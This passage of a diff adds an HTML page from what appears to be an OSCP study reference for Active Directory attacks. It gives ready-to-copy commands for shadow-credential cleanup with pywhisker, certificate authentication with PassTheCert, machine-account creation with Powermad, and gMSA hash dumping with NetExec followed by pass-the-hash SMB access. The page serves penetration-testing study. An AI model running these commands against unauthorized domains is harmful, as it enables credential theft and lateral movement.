+# Remove only the key credential you added; never clear unrelated original values
+python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
+  --target TARGET_USER --action remove --device-id DEVICE_ID
+</code></pre>
+<p>Read: a successful attribute write does not yet establish a TGT or service authorization. Verify the cached principal and the intended service. PKINIT/certificate failure → inspect KDC support, mapping and trust; do not keep overwriting keys. Preserve the original state and remove only your added DeviceID after the test.</p>
+<p>Sources: <a href="https://github.com/ShutdownRepo/pywhisker">upstream 1</a> · <a href="https://github.com/dirkjanm/PKINITtools">upstream 2</a>.</p>
+<h2 id="passthecert--schannelldap-when-the-certificate-is-usable-there">PassTheCert — Schannel/LDAP when the certificate is usable there</h2>
+<p>Use a certificate/private key mapped to an accepted AD identity with the necessary trust/EKU and a working LDAP TLS path. PKINIT and Schannel are different authentication paths: failure of one does not prove the other works or fails.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Extract PEM material from the relevant PFX; respond to password prompts
+openssl pkcs12 -in USER.pfx -clcerts -nokeys -out USER.crt
+openssl pkcs12 -in USER.pfx -nocerts -nodes -out USER.key
+
+# First identify the principal accepted through the certificate
+python3 passthecert.py -action whoami -crt USER.crt -key USER.key \
+  -domain DOMAIN -dc-host DC_HOST -dc-ip DC_IP
+
+# Inspect operations in the LDAP shell before choosing an authorized write
+python3 passthecert.py -action ldap-shell -crt USER.crt -key USER.key \
+  -domain DOMAIN -dc-host DC_HOST -dc-ip DC_IP
+</code></pre>
+<p>Read: successful binding proves that mapped identity's LDAP context, not domain administration. The same object ACL still governs group/password/delegation writes. Certificate trust/mapping, TLS policy or a missing private key can block this route. Do not weaken workstation-wide TLS settings to compensate for an unexplained failure.</p>
+<p>Sources: <a href="https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/README.md">upstream 1</a>.</p>
+<h2 id="powermad--create-an-account-only-when-the-chosen-ad-path-needs-it">Powermad — create an account only when the chosen AD path needs it</h2>
+<p>Use from a suitable authenticated PowerShell context when the actual quota/delegation permits computer creation and the planned path needs an account/SPN you control. Account creation alone does not grant RBCD rights on another host.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Import-Module .\Powermad.ps1
+$machinePassword = ConvertTo-SecureString 'MACHINE_PASSWORD' -AsPlainText -Force
+New-MachineAccount -MachineAccount NEWPC -Password $machinePassword `
+  -Domain DOMAIN -DomainController DC_HOST
+</code></pre>
+<p>Read: verify the created account, its SPNs and the chosen target-object permission separately. Quota, OU ACLs and existing names can stop the operation. Standard create rights do not necessarily permit deleting the created account later; establish the cleanup route and avoid repeated throwaway account creation.</p>
+<p>Sources: <a href="https://github.com/Kevin-Robertson/Powermad">upstream 1</a>.</p>
+<h2 id="gmsa--obtain-a-decoded-hash-only-with-managed-password-read-rights">gMSA — obtain a decoded hash only with managed-password read rights</h2>
+<p>Use when the accepted directory identity has the managed-password read permission for the gMSA. NetExec selects LDAPS for this operation, so the DC's LDAP TLS path must work.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nxc ldap DC_IP -d DOMAIN -u USER -p 'PASSWORD' --gmsa
+
+# After identifying the returned service account and hash, test one relevant service
+nxc smb TARGET -d DOMAIN -u 'GMSA$' -H HASH --shares
+</code></pre>
+<p>Read: keep the exact service-account name and decoded NT hash together; an encoded <code>msDS-ManagedPassword</code> blob is a different representation. Authentication acceptance still does not prove administrative/remote-execution rights. Empty output → inspect object permissions, LDAPS, account type and collection errors before concluding that no gMSA path exists.</p>
+<p>Sources: <a href="https://www.netexec.wiki/ldap-protocol/dump-gmsa">upstream 1</a>.</p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li>Supplied PEN-200, Chapter 23, especially the targeted Kerberoast, silver-ticket and DCSync sections.</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge">OffSec OSCP+ Body of Knowledge</a></li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerSploit PowerView (archived)</a></li>
+<li><a href="https://lizajose.github.io/getSH/ad">getSH Active Directory: Object Permissions, AD CS, GPO Abuse and Domain Compromise</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+<li><a href="https://github.com/ly4k/Certipy">Certipy</a></li>
+<li><a href="https://github.com/fortra/impacket/blob/master/examples/secretsdump.py">Impacket secretsdump</a></li>
+<li><a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">SpecterOps AD CS research</a></li>
+<li><a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/active-directory">Hexdump Active Directory modules</a></li>
+</ul></article></div></main></div></div><footer class="site-footer" data-astro-cid-jo6i4kqk><div class="footer-inner" data-astro-cid-jo6i4kqk><nav class="footer-links" aria-label="Footer navigation" data-astro-cid-jo6i4kqk><a href="/" data-astro-cid-jo6i4kqk>Home</a><a href="/projects/" data-astro-cid-jo6i4kqk>Projects</a><a href="/tools/" aria-current="page" data-astro-cid-jo6i4kqk>Tools</a></nav><nav class="footer-tools" aria-label="Interactive tools" data-astro-cid-jo6i4kqk><span data-astro-cid-jo6i4kqk>Interactive tools</span><a href="/tools/oscp/" aria-current="page" data-astro-cid-jo6i4kqk>OSCP strategy workspace <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a><a href="/tools/attack-path/" data-astro-cid-jo6i4kqk>Attack-path visualizer <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a></nav><div class="footer-meta" data-astro-cid-jo6i4kqk><p data-astro-cid-jo6i4kqk>© 2026 Armaan. Built with curiosity.</p><div data-astro-cid-jo6i4kqk><a href="https://github.com/ArmaanLeg3nd" target="_blank" rel="noreferrer" data-astro-cid-jo6i4kqk>GitHub ↗</a><span data-astro-cid-jo6i4kqk>GMT+8</span></div></div></div></footer><script type="module" src="/_assets/MotionController.astro_astro_type_script_index_0_lang.BuT1diwy.js"></script></body></html><script type="module">function e(){document.querySelectorAll(`[data-reference-copy]`).forEach(e=>{e.dataset.ready||(e.dataset.ready=`true`,e.addEventListener(`click`,async()=>{let t=e.parentElement?.querySelector(`code`);if(t){try{await navigator.clipboard.writeText(t.textContent||``),e.textContent=`Copied`}catch{e.textContent=`Select and copy`}window.setTimeout(()=>e.textContent=`Copy`,1600)}}))})}e(),document.addEventListener(`astro:page-load`,e);</script>
